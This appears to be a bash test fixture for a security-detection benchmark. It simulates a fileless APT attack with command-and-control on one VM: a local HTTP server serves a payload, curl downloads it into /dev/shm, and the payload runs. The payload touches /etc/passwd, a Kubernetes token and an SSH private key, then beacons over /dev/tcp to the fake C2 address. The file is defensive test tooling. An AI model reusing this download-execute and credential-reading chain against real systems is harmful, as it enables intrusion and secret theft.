#!/usr/bin/env bash
# Endpoint-local apt-fileless-c2: self-contained downloader + payload + C2
# fixture for single-VM benchmarks. It keeps the IOC address identical to the
# topology scenario while serving it from node-a itself.
set -euo pipefail

C2="${C2:-10.66.0.99}"
HTTP_PORT="${HTTP_PORT:-8080}"
C2_PORT="${C2_PORT:-443}"
FIXTURE_DIR="${FIXTURE_DIR:-/tmp/sysarmor-c2-local}"
PAYLOAD="/dev/shm/x.sh"
BEACON="/dev/shm/.beacon"

cleanup() {
  if [[ -n "${HTTP_PID:-}" ]]; then kill "$HTTP_PID" 2>/dev/null || true; fi
  if [[ -n "${C2_PID:-}" ]]; then kill "$C2_PID" 2>/dev/null || true; fi
  ip addr del "$C2/32" dev lo 2>/dev/null || true
}
trap cleanup EXIT

rm -rf "$FIXTURE_DIR"
mkdir -p "$FIXTURE_DIR/www"
rm -f "$PAYLOAD" "$BEACON"
ip addr add "$C2/32" dev lo 2>/dev/null || true

cat >"$FIXTURE_DIR/www/x.sh" <<EOF
#!/usr/bin/env bash
set -euo pipefail
cat /etc/passwd >/dev/null 2>&1 || true
cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 || true
cat /root/.ssh/id_rsa >/dev/null 2>&1 || true
printf 'sysarmor-local-c2\\n' > "$BEACON"
bash -c 'exec 3<>/dev/tcp/$C2/$C2_PORT; printf "hello-from-payload\\n" >&3; cat <&3 >/dev/null || true' || true
echo "[x.sh] local post-exploitation done"
EOF
chmod 0644 "$FIXTURE_DIR/www/x.sh"

python3 -m http.server "$HTTP_PORT" --bind "$C2" --directory "$FIXTURE_DIR/www" \
  >"$FIXTURE_DIR/http.log" 2>"$FIXTURE_DIR/http.err" &
HTTP_PID=$!

python3 - "$C2" "$C2_PORT" >"$FIXTURE_DIR/c2.log" 2>"$FIXTURE_DIR/c2.err" <<'PY' &
import socket
import sys

host, port = sys.argv[1], int(sys.argv[2])
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    conn, addr = s.accept()
    with conn:
        data = conn.recv(4096)
        sys.stdout.write(f"accepted {addr[0]}:{addr[1]} bytes={len(data)}\n")
        sys.stdout.flush()
        conn.sendall(b"ack\n")
PY
C2_PID=$!

sleep 1
curl --noproxy '*' -fsS "http://$C2:$HTTP_PORT/x.sh" -o "$PAYLOAD"
chmod +x "$PAYLOAD"
bash "$PAYLOAD"

test -s "$BEACON"
echo "[apt-fileless-c2-local] attack executed (vm endpoint local fixture)"
